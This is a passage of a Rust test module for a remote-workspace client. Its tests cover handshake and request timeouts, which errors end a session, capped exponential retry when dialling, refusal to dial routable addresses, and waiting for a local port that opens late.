        .await
        .expect("the handshake deadline fires instead of waiting forever")
        .expect_err("a silent peer must not produce a session");
        match outcome {
            RemoteError::Timeout { request, after } => {
                assert!(request.contains("handshake"), "{request}");
                assert_eq!(after, Duration::from_millis(250));
            }
            other => panic!("expected a handshake timeout, got {other}"),
        }
        accepted.abort();
    }

    #[test]
    fn a_zero_deadline_is_refused_rather_than_failing_every_call() {
        let reason = RemoteWorkspaceConfig::new()
            .handshake_timeout(Duration::ZERO)
            .validate()
            .expect_err("a zero handshake timeout fails every connection");
        assert!(reason.contains("handshake"), "{reason}");
        let reason = RemoteWorkspaceConfig::new()
            .request_timeout(Some(Duration::ZERO))
            .validate()
            .expect_err("a zero request timeout fails every request");
        assert!(reason.contains("request"), "{reason}");
        assert!(
            RemoteWorkspaceConfig::new().validate().is_ok(),
            "the defaults are a bounded handshake and no request deadline"
        );
    }

    /// Only a stream failure ends a session. A refusal is an answer.
    #[test]
    fn a_refusal_leaves_the_session_usable_and_a_stall_does_not() {
        for error in [
            RemoteError::NotFound { path: "a".into() },
            RemoteError::PathRejected {
                reason: "outside".into(),
            },
            RemoteError::Conflict {
                expected_sha256: "a".into(),
                actual_sha256: "b".into(),
            },
            RemoteError::CapabilityNotGranted {
                capability: RemoteCapability::Git,
            },
            RemoteError::Exec {
                reason: "exit 1".into(),
            },
        ] {
            assert!(
                !kills_the_session(&error),
                "{error} was answered, so the session still works"
            );
        }
        for error in [
            RemoteError::Protocol {
                reason: "desynced".into(),
            },
            RemoteError::Io {
                context: "read frame".into(),
                reason: "connection reset".into(),
            },
            RemoteError::Timeout {
                request: "read".into(),
                after: Duration::from_secs(1),
            },
        ] {
            assert!(kills_the_session(&error), "{error} leaves no usable stream");
        }
    }

    #[test]
    fn the_dial_wait_doubles_stops_at_its_cap_and_ends_with_the_window() {
        let retry = DialRetry::new(Duration::from_secs(30));
        assert_eq!(
            retry.delay(0, Duration::ZERO),
            Some(Duration::from_millis(100))
        );
        assert_eq!(
            retry.delay(1, Duration::ZERO),
            Some(Duration::from_millis(200))
        );
        assert_eq!(
            retry.delay(2, Duration::ZERO),
            Some(Duration::from_millis(400))
        );
        assert_eq!(
            retry.delay(40, Duration::ZERO),
            Some(Duration::from_secs(2)),
            "the doubling is capped, so a long wait is not one huge sleep"
        );
        assert_eq!(
            retry.delay(0, Duration::from_secs(30)),
            None,
            "the window is spent"
        );
        assert_eq!(
            DialRetry::new(Duration::ZERO).delay(0, Duration::ZERO),
            None,
            "no patience means one attempt"
        );

        // A wait that would end past the window is not started at all, or the
        // caller would still be trying after its own patience had run out.
        let tight = DialRetry::new(Duration::from_millis(150));
        assert_eq!(
            tight.delay(0, Duration::ZERO),
            Some(Duration::from_millis(100))
        );
        assert_eq!(tight.delay(0, Duration::from_millis(60)), None);
    }

    /// A routable address is refused at parse time. Retrying that would be
    /// retrying a decision, and every second spent on it is a second the caller
    /// is not told what went wrong.
    #[tokio::test]
    async fn a_refused_address_is_not_retried() {
        let started = std::time::Instant::now();
        let error = RemoteWorkspace::dial_tcp_waiting(
            "8.8.8.8:4100".parse().expect("routable addr"),
            DialRetry::new(Duration::from_secs(30)),
        )
        .await
        .expect_err("a routable address is never dialled");
        assert!(
            matches!(error, RemoteError::InvalidRequest { .. }),
            "{error}"
        );
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "the refusal came back immediately, not after the window"
        );
    }

    /// A port this test can promise stays its own for the whole run.
    ///
    /// The wait is only visible on a port that is closed when the dial starts and open
    /// a moment later, and reserving one with `bind("127.0.0.1:0")` does not buy that:
    /// the number goes back into the kernel's ephemeral pool the moment the probe is
    /// dropped, and on Linux that pool is 32768..=60999, the very range every other
    /// test's `bind(:0)` draws from. A sibling test can be handed the same number and
    /// start listening on it, which makes the first dial succeed and takes the
    /// premise away. It did, twice on 2026-10-04, and the panic named the missing
    /// retry rather than the port someone else had taken.
    ///
    /// A named port below every system's ephemeral range cannot be handed out that
    /// way: Linux allocates from 32768 up and macOS and Windows from 49152 up, and
    /// nothing else in this repository binds 21787. The port is still probed below, so
    /// a machine where something else does use it says so instead of passing for a
    /// reason this test cannot see.
    const LATE_TRANSPORT_PORT: u16 = 21787;

    /// The reason the wait exists: the tunnel or socket-activated server is not up
    /// yet, and the first attempt would otherwise be the only one.
    #[tokio::test]
    async fn a_transport_that_comes_up_later_is_waited_for() {
        let addr = std::net::SocketAddr::from(([127, 0, 0, 1], LATE_TRANSPORT_PORT));
        let probe = tokio::net::TcpListener::bind(addr)
            .await
            .unwrap_or_else(|error| panic!("port {addr} has to be free to test anything: {error}"));
        drop(probe);

        let appear = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(250)).await;
            let listener = tokio::net::TcpListener::bind(addr)
                .await
                .unwrap_or_else(|error| {
                    panic!("only this test should be waiting for port {addr}: {error}")
                });
            let (_stream, _peer) = listener.accept().await.expect("accept");
        });

        let started = std::time::Instant::now();
        let stream =
            RemoteWorkspace::dial_tcp_waiting(addr, DialRetry::new(Duration::from_secs(10)))
                .await
                .expect("the dial should keep trying until the port is there");
        let elapsed = started.elapsed();
        assert!(
            stream.peer_addr().is_ok(),
            "the returned stream is the connection"
        );
        assert!(
            elapsed >= Duration::from_millis(200),
            "at least one retry happened: the port was not there first time"
        );
        appear.await.expect("the peer task");
    }

    fn git(dir: &std::path::Path, args: &[&str]) -> Result<(), String> {
        let output = std::process::Command::new("git")
            .args(args)
            .current_dir(dir)
            .output()
            .map_err(|e| format!("git {args:?}: {e}"))?;
        if output.status.success() {
            Ok(())
        } else {
            Err(format!(
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            ))
        }
    }
}
